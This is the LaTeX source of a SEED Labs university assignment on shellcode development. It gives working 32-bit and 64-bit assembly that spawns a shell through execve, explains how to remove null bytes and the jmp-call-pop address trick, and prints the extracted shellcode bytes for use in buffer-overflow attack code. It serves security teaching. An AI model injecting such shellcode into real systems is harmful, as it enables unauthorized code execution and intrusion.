%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../../common-files}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}
\usepackage{hyperref}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}

% Arrows
\newcommand{\pointleft}[1]{\reflectbox{\ding{217}} \textbf{\texttt{#1}}}
\newcommand{\pointright}[1]{\ding{217} \textbf{\texttt{#1}}}
\newcommand{\pointupleft}[1]{\reflectbox{\ding{218}} \textbf{\texttt{#1}}}

% Line numbers
\newcommand{\lineone}{\ding{192}\xspace}
\newcommand{\linetwo}{\ding{193}\xspace}
\newcommand{\linethree}{\ding{194}\xspace}
\newcommand{\linefour}{\ding{195}\xspace}
\newcommand{\linefive}{\ding{196}\xspace}
\newcommand{\linesix}{\ding{197}\xspace}
\newcommand{\lineseven}{\ding{198}\xspace}
\newcommand{\lineeight}{\ding{199}\xspace}
\newcommand{\linenine}{\ding{200}\xspace}


% Fancy headers
\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

\newcommand{\seedisbook}{\textit{Internet Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

\newcommand{\seedcsbook}{\textit{Computer Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

\newcommand{\seedcibook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 3rd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.\xspace}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.\xspace}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.\xspace}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website.\xspace}

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website.\xspace}

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website.\xspace}

\newcommand{\seedenvironmentC}{This lab has been tested on the SEED
Ubuntu 20.04 VM. You can download a pre-built image from the SEED website, 
and run the SEED VM on your own computer. However,
most of the SEED labs can be conducted on the cloud, and 
you can follow our instruction to create a SEED VM on the cloud.\xspace}

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website.\xspace}

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend much on the SEED VM. You can do this lab
using other VMs, physical machines, or VMs on the cloud.\xspace}

\newcommand{\adddns}{You do need to add the required IP address mapping to
the \texttt{/etc/hosts} file.\xspace}





\input{\commonfolder/copyright}



\lhead{\bfseries SEED Labs -- Shellcode Development Lab}


\begin{document}

\begin{center}
{\LARGE Shellcode Development Lab}
\end{center}

\seedlabcopyright{2020}



% *******************************************
% SECTION
% ******************************************* 
\section{Overview}

Shellcode is widely used in many attacks that involve 
code injection. Writing shellcode is quite challenging. Although
we can easily find existing shellcode from the Internet, 
there are situations where we have to write a shellcode that 
satisfies certain specific requirements. Moreover, 
to be able to write our own shellcode from scratch is 
always exciting. 
There are several interesting 
techniques involved in shellcode. 
The purpose of 
this lab is to help students understand these techniques 
so they can write their own shellcode.  


There are several challenges in writing shellcode, one is to 
ensure that there is no zero in the binary, and the other is to find 
out the address of the data used in the command. 
The first challenge is not very difficult to solve, and there
are several ways to solve it. The solutions to the 
second challenge led to two typical approaches to 
write shellcode. In one approach, data are pushed 
into the stack during the execution, so their addresses 
can be obtained from the stack pointer. 
In the second approach, data are stored in the code 
region, right after a \texttt{call} instruction. 
When the \texttt{call} instruction is executed, 
the address of the data is treated as the return address,
and is pushed into the stack. 
Both solutions are quite elegant, 
and we hope students can learn these two techniques. 
This lab covers the following topics:

\begin{itemize}[noitemsep]
\item Shellcode
\item Assembly code
\item Disassembling 
\end{itemize}


\paragraph{Readings and videos.}
Detailed coverage of the shellcode can be found in the following:

\begin{itemize}
\item Chapters 4.7 of the SEED Book, \seedbook
\item Section 4 of the SEED Lecture (Lecture 30), \seedcsvideo
\end{itemize}


\paragraph{Lab environment.} \seedenvironmentC


% *******************************************
% SECTION
% ******************************************* 
\section{Task 1: Writing Shellcode}


In this task, we will first start with a shellcode example,
to demonstrate how to write a shellcode. After that, we ask
students to modify the code to accomplish various tasks. 

Shellcode is typically written using assembly languages, which
depend on the computer architecture. We will be using 
the Intel architectures, which have two types of processors:
x86 (for 32-bit CPU) and x64 (for 64-bit CPU). In this 
task, we will focus on 32-bit shellcode. In the final task,
we will switch to 64-bit shellcode.  
Although most of the computers these days are 64-bit computers,
they can run 32-bit programs. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 1.a: The Entire Process}

In this task, we provide a basic x86 shellcode to show students 
how to write a shellcode from scratch. Students 
can download this code from the lab's website, go through
the entire process described in this task. 
The code is 
provided in the following. \textbf{Note:} please do not copy and paste from
this PDF file, because some of characters might be changed
due to the copy and paste. Instead, download the file from
the lab's website. 

Brief explanation of the code is given in the comment, but if students 
want to see a full explanation, they can find much more detailed explanation 
of the code in the SEED book (Chapter 4.7) and also 
in the SEED lecture (Lecture 30 of the Computer Security course). 


\begin{lstlisting}[caption={A basic shellcode example \texttt{mysh.s}}]
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax
      push eax          ; Use 0 to terminate the string  
      push "//sh"       ;                                  (*@\ding{202}@*)
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0                      (*@\ding{203}@*)
      push ebx          ; argv[0] points to the cmd string (*@\ding{204}@*)
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      xor  edx, edx     ; No env variable                  (*@\ding{205}@*)

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b 
      int 0x80
\end{lstlisting}


\paragraph{Compiling to object code.}
We compile the assembly code above (\texttt{mysh.s}) using \texttt{nasm}, which 
is an assembler and disassembler for the Intel x86 and x64 architectures.
The \texttt{-f elf32} option indicates that we want to compile the code
to 32-bit ELF binary format. The Executable and Linkable Format (ELF) 
is a common standard file format for executable file, object code, shared libraries. 
For 64-bit assembly code, \texttt{elf64} should be used. 

\begin{lstlisting}
$ nasm -f elf32 mysh.s -o mysh.o
\end{lstlisting}


\paragraph{Linking to generate final binary.}
Once we get the object code \texttt{mysh.o}, if we want to generate the 
executable binary, we can run the linker program \texttt{ld}, which
is the last step in compilation. The \texttt{-m elf\_i386} option means 
generating the 32-bit ELF binary. 
After this step, we get the final
executable code \texttt{mysh}. If we run it, we can get a shell. 
Before and after running \texttt{mysh},  
we print out the current shell's process IDs using \texttt{echo \$\$},
so we can clearly see that \texttt{mysh} indeed starts a new shell. 

\begin{lstlisting}
$ ld -m elf_i386 mysh.o -o mysh

$ echo $$
25751    (*@\reflectbox{\ding{217}} the process ID of the current shell@*)
$ mysh
$ echo $$
9760     (*@\reflectbox{\ding{217}} the process ID of the new shell@*)
\end{lstlisting}



\paragraph{Getting the machine code.}
During the attack, we only need the machine code 
of the shellcode, not a standalone executable file, which
contains data other than the actual machine code. 
Technically, only the machine code is called shellcode. 
Therefore, we need to extract the machine
code from the executable file or the object file.
There are various ways to do that. One way is to 
use the \texttt{objdump} command to disassemble the 
executable or object file. 

There are two different common syntax modes for assembly code, 
one is the AT\&T syntax mode, and the other is 
Intel syntax mode. By default, \texttt{objdump} uses
the AT\&T mode. In the following, 
we use the \texttt{-Mintel} option to 
produce the assembly code in the Intel mode. 

\begin{lstlisting}
$ objdump -Mintel --disassemble mysh.o
mysh.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:	(*@\textbf{31 db}@*)    xor    ebx,ebx
   2:	(*@\textbf{31 c0}@*)    xor    eax,eax
            ... (code omitted) ...
  1f:	(*@\textbf{b0 0b}@*)    mov    al,0xb
  21:	(*@\textbf{cd 80}@*)    int    0x80
\end{lstlisting}
 
In the above printout, the highlighted numbers are machine code.
You can also use the \texttt{xxd} command to print out 
the content of the binary file, and you should be 
able to find out the shellcode's machine
code from the printout.

\begin{lstlisting}
$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
...
000000000000000000000000(*@\textbf{31db31c0b0d5cd80}@*)
(*@\textbf{31c050682f2f7368682f62696e89e3505389e131}@*)
(*@\textbf{d231c0b00bcd80}@*)00000000000000000000000000
...
\end{lstlisting}
 

\paragraph{Using the shellcode in attacking code.}
In actual attacks, we need to include the shellcode
in our attacking code, such as a Python or C program.
We usually store the machine code in an array, but
converting the machine code printed above 
to the array assignment in Python and C programs
is quite tedious if done manually, especially if 
we need to perform this process many times in the lab. 
We wrote the following Python code to
help this process. Just copy whatever you
get from the \texttt{xxd} command (only the shellcode part)
and paste it to the following code, between the lines
marked by \texttt{"""}. The code can be downloaded from the 
lab's website.


\begin{lstlisting}[caption=\texttt{convert.py}] 
#!/usr/bin/env python3

# Run "xxd -p -c 20 mysh.o", and
# copy and paste the machine code part to the following:
ori_sh ="""
31db31c0b0d5cd80
31c050682f2f7368682f62696e89e3505389e131
d231c0b00bcd80
"""

sh = ori_sh.replace("\n", "")

length  = int(len(sh)/2)
print("Length of the shellcode: {}".format(length))
s = 'shellcode= (\n' + '   "'
for i in range(length):
    s += "\\x" + sh[2*i] + sh[2*i+1]
    if i > 0 and i % 16 == 15:
       s += '"\n' + '   "'
s += '"\n' + ").encode('latin-1')"
print(s)
\end{lstlisting}
 
The \texttt{convert.py} program will print out the 
following Python code that you can include 
in your attack code. It stores the shellcode in
a Python array. 
 
\begin{lstlisting}
$ ./convert.py
Length of the shellcode: 35
shellcode= (
   "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
   "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
   "\x0b\xcd\x80"
).encode('latin-1')
\end{lstlisting}



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 1.b. Eliminating Zeros from the Code}

Shellcode is widely used in buffer-overflow attacks. In many 
cases, the vulnerabilities are caused by string copy, such
as the \texttt{strcpy()} function. For these string copy functions,
zero is considered as the end of the string. Therefore, if we have 
a zero in the middle of a shellcode, string copy will not be able to
copy anything after the zero from this shellcode to the target 
buffer, so the attack will not be able to succeed. 

Although not all the vulnerabilities have issues with zeros, 
it becomes a requirement for shellcode not to have any zero in
the machine code; otherwise, the application of a shellcode 
will be limited. 

There are many techniques that can get rid of zeros 
from the shellcode. The code \texttt{mysh.s} needs to 
use zeros in four different places. Please identify all
of those places, and explain how the code uses zeros
but without introducing zero in the code. Some hints 
are given in the following:


\begin{itemize}
\item If we want to assign zero to \texttt{eax}, we 
can use \texttt{"mov eax, 0"}, but doing so,
we will get a zero in the machine code. A typical way
to solve this problem is to use \texttt{"xor eax, eax"}. 
Please explain why this would work.

\item If we want to store \texttt{0x00000099} to
\texttt{eax}. We cannot just use \texttt{mov eax, 0x99}, because 
the second operand is actually \texttt{0x00000099}, which contains three zeros. 
To solve this problem, we can first set \texttt{eax} to zero, and then
assign a one-byte number \texttt{0x99} to the \texttt{al} register, which 
is the least significant 8 bits of the \texttt{eax} register. 


\item Another way is to use shift. In the following code,
first \texttt{0x237A7978} is assigned to \texttt{ebx}.
The ASCII values for \texttt{x}, \texttt{y}, \texttt{z}, and \texttt{\#} are 
\texttt{0x78}, \texttt{0x79}, \texttt{0x7a}, \texttt{0x23}, 
respectively. Because most Intel CPUs use the small-Endian byte order,
the least significant byte is the one stored at the lower address (i.e., the
character \texttt{x}), so the number presented by \texttt{xyz\#} is 
actually \texttt{0x237A7978}. You can see this when you dissemble the 
code using \texttt{objdump}. 

After assigning the number to \texttt{ebx},  
we shift this register to the left 
for 8 bits, so the most significant byte \texttt{0x23} will 
be pushed out and discarded. 
We then shift the register to the right for 8 bits,
so the most significant byte will be filled with \texttt{0x00}. 
After that, \texttt{ebx} will contain \texttt{0x007A7978}, 
which is equivalent to \texttt{"xyz\textbackslash 0"}, i.e., the last
byte of this string becomes zero. 

\begin{lstlisting}
mov  ebx, "xyz#"
shl  ebx, 8
shr  ebx, 8
\end{lstlisting}
\end{itemize}


\paragraph{Task.}
In Line \ding{202} of the shellcode \texttt{mysh.s}, 
we push \texttt{"//sh"} into the stack. Actually, we 
just want to push \texttt{"/sh"} into the stack, but 
the \texttt{push} instruction has to push a 32-bit number.
Therefore, we add a redundant \texttt{/} at the beginning; 
for the OS, this is equivalent to just one single \texttt{/}.  


For this task, we will use the shellcode to execute
\texttt{/bin/bash}, which has 9 bytes in the command string (10 bytes if 
counting the zero at the end). Typically, to push
this string to the stack, we need to make the length
multiple of 4, so we would convert the string
to \texttt{/bin////bash}. 

However, for this task,   
you are not allowed to add any
redundant \texttt{/} to the string, i.e., the length of the 
command must be 9 bytes (\texttt{/bin/bash}).
Please demonstrate how you can do that.
In addition to showing that you can get a bash shell, you also
need to show that there is no zero in your code. 



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 1.c. Providing Arguments for System Calls}
 
Inside \texttt{mysh.s}, in Lines \ding{203} and \ding{204},
we construct the \texttt{argv[]} array for the 
\texttt{execve()} system call. Since 
our command is \texttt{/bin/sh}, without any command-line
arguments, our \texttt{argv} array only contains 
two elements: the first one is a pointer to 
the command string, and the second one is zero. 

In this task, we need to run the 
following command, i.e., we want to use 
\texttt{execve} to execute the following command, which
uses \texttt{/bin/sh} to execute the \texttt{"ls -la"}
command. 

\begin{lstlisting}
/bin/sh -c "ls -la"
\end{lstlisting}

In this new command, the \texttt{argv} array should have 
the following four elements, all of which need to be 
constructed on the stack. Please modify \texttt{mysh.s} and 
demonstrate your execution result. As usual, you cannot have 
zero in your shellcode (you are allowed to use redundant /). 

\begin{lstlisting}
argv[3] = 0
argv[2] = "ls -la"
argv[1] = "-c"
argv[0] = "/bin/sh"
\end{lstlisting}
 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 1.d. Providing Environment Variables for \texttt{execve()}}

The third parameter for the \texttt{execve()} system call
is a pointer to the environment variable array, and it allows 
us to pass environment variables to the program. In our 
sample program (Line \ding{205}), we
pass a null pointer to \texttt{execve()}, so
no environment variable is passed to the program. 
In this task, we will pass some environment variables. 

If we change the command \texttt{"/bin/sh"} in our shellcode
\texttt{mysh.s} to \texttt{"/usr/bin/env"}, which is a command to print out the 
environment variables. You can find out that when we run
our shellcode, there will be no output, because our 
process does not have any environment variable.


In this task, we will write a shellcode called \texttt{myenv.s}. When this 
program is executed, it executes the \texttt{"/usr/bin/env"} command, which
can print out the following environment variables: 

\begin{lstlisting}
$ ./myenv
aaa=1234
bbb=5678
cccc=1234
\end{lstlisting}

It should be noted that the value for the environment variable \texttt{cccc}
must be exactly 4 bytes (no space is allowed to be added to the tail).
We intentionally make the length of this environment variable string (name and value)
not multiple of 4.


To write such a shellcode, we need to construct an
environment variable array on the stack, 
and store the address of this array to the \texttt{edx} register,  
before invoking \texttt{execve()}.  
The way to construct this array on the stack is exactly the same
as the way how we construct the \texttt{argv[]} array. Basically,
we first store the actual environment variable strings on the stack.
Each string has a format of \texttt{name=value}, and it is terminated by
a zero byte. We need to get the addresses of these 
strings. Then, we construct the 
environment variable array, also on the stack, and store the 
addresses of the strings in this array.  
The array should look like the following (the order of 
the elements \texttt{0}, \texttt{1}, and \texttt{2} does not matter): 

\begin{lstlisting}
env[3] = 0   // 0 marks the end of the array
env[2] = address to the "cccc=1234" string
env[1] = address to the "bbb=5678"  string
env[0] = address to the "aaa=1234"  string
\end{lstlisting}









% *******************************************
% SECTION
% ******************************************* 
\section{Task 2: Using Code Segment}

As we can see from the shellcode in Task 1, 
the way how it solves the data address problem is that 
it dynamically constructs all the necessary 
data structures on the stack,
so their addresses can be obtained from the 
stack pointer \texttt{esp}.

There is another approach to solve the same problem,
i.e., getting the address of all the necessary
data structures. In this approach, data are stored in the code
region, and its address is obtained 
via the function call mechanism. Let's look at the following
code. 

\begin{lstlisting}[caption={\texttt{mysh2.s}}]
section .text
  global _start
    _start:
        BITS 32
        jmp short two
    one:
        pop ebx                   (*@\ding{202}@*)
        xor eax, eax
        mov [ebx+7],  al  ; save 0x00 (1 byte) to memory at address ebx+7
        mov [ebx+8],  ebx ; save ebx (4 bytes) to memory at address ebx+8
        mov [ebx+12], eax ; save eax (4 bytes) to memory at address ebx+12
        lea ecx, [ebx+8]  ; let ecx = ebx + 8
        xor edx, edx
        mov al,  0x0b
        int 0x80
     two:
        call one
        db '/bin/sh*AAAABBBB' ;  (*@\ding{203}@*)
\end{lstlisting}

The code above first jumps to the instruction at 
location \texttt{two}, which does another 
jump (to location \texttt{one}), but this time,
it uses the \texttt{call} instruction.  This instruction 
is for function call, i.e., before it jumps to
the target location, it keeps a record of the address
of the next instruction as the return address, so when
the function returns, it can return to the 
instruction right after the \texttt{call} instruction.  

In this example, the ``instruction'' right after the 
\texttt{call} instruction (Line \ding{203}) is not actually an instruction; 
it stores a string. However, this does not matter, the
\texttt{call} instruction will push its address (i.e.,
the string's address) into the stack, in the return
address field of the function frame. When we 
get into the function, i.e., after jumping to 
location \texttt{one}, the top of the stack 
is where the return address is stored. Therefore,
the \texttt{pop ebx} instruction in Line \ding{202} actually
get the address of the string on Line \ding{203}, 
and save it to the \texttt{ebx} register. That is how the 
address of the string is obtained. 


The string at Line \ding{203} is not a completed string; it 
is just a place holder. 
The program needs to construct the needed data structure
inside this place holder. Since the address of the string
is already obtained, the address of all the data 
structures constructed inside this place holder can
be easily derived. 


If we want to get an executable, we need to use 
the \texttt{--omagic} option when running the 
linker program (\texttt{ld}), so 
the code segment is writable. 
By default, the code segment is not writable.
When this program runs, it needs to modify the data stored
in the code region; if the code segment is not 
writable, the program will crash. 
This is not a problem for actual attacks, because
in attacks, the code is typically injected into a writable data 
segment (e.g. stack or heap). Usually we do not run shellcode 
as a standalone program. 


\begin{lstlisting}
$ nasm -f elf32 mysh2.s -o mysh2.o
$ ld --omagic -m elf_i386 mysh2.o -o mysh2
\end{lstlisting}


\paragraph{Tasks.} You need to do the followings:
(1) Please provide a detailed explanation for each line of the 
code in \texttt{mysh2.s}, starting from the line labeled \texttt{one}.
Please explain why this code would successfully execute 
the \texttt{/bin/sh} program, how the \texttt{argv[]} array is
constructed, etc. 
(2) Please use the technique from \texttt{mysh2.s} to 
implement a new shellcode, so it 
executes \texttt{/usr/bin/env}, and it prints out 
the following environment variables: 

\begin{lstlisting}
a=11
b=22
\end{lstlisting}


% *******************************************
% SECTION
% ******************************************* 
\section{Task 3: Writing 64-bit Shellcode}

Once we know how to write the 32-bit shellcode, writing 64-bit
shellcode will not be difficult, because they are quite similar;
the differences are mainly in the registers. 
For the x64 architecture, invoking system call is done through
the \texttt{syscall} instruction, and the first three arguments 
for the system call are stored in the \texttt{rdx}, \texttt{rsi}, 
\texttt{rdi} registers, respectively. 
The following is an example of 64-bit shellcode:

\begin{lstlisting}[caption={A 64-bit shellcode \texttt{mysh\_64.s}}]
  section .text
  global _start
    _start:
      ; The following code calls execve("/bin/sh", ...)
      xor  rdx, rdx       ; 3rd argument (stored in rdx)
      push rdx
      mov rax,'/bin//sh'  
      push rax
      mov rdi, rsp        ; 1st argument (stored in rdi)
      push rdx
      push rdi
      mov rsi, rsp        ; 2nd argument (stored in rsi)
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall
\end{lstlisting}

We can use the following commands to compile the assemble code into
64-bit binary code: 

\begin{lstlisting}
$ nasm -f elf64 mysh_64.s -o mysh_64.o
$ ld mysh_64.o -o mysh_64
\end{lstlisting}

\paragraph{Task.}
Repeat Task 1.b for this 64-bit shellcode. Namely, 
instead of executing \texttt{"/bin/sh"}, we need to execute
\texttt{"/bin/bash"}, and we are not allowed to use
any redundant \texttt{/} in the command string, 
i.e., the length of the command must be 9 bytes (\texttt{/bin/bash}).
Please demonstrate how you can do that.
In addition to showing that you can get a bash shell, you also
need to show that there is no zero in your code. 

% *******************************************
% SECTION
% *******************************************
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/submission}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\end{document}







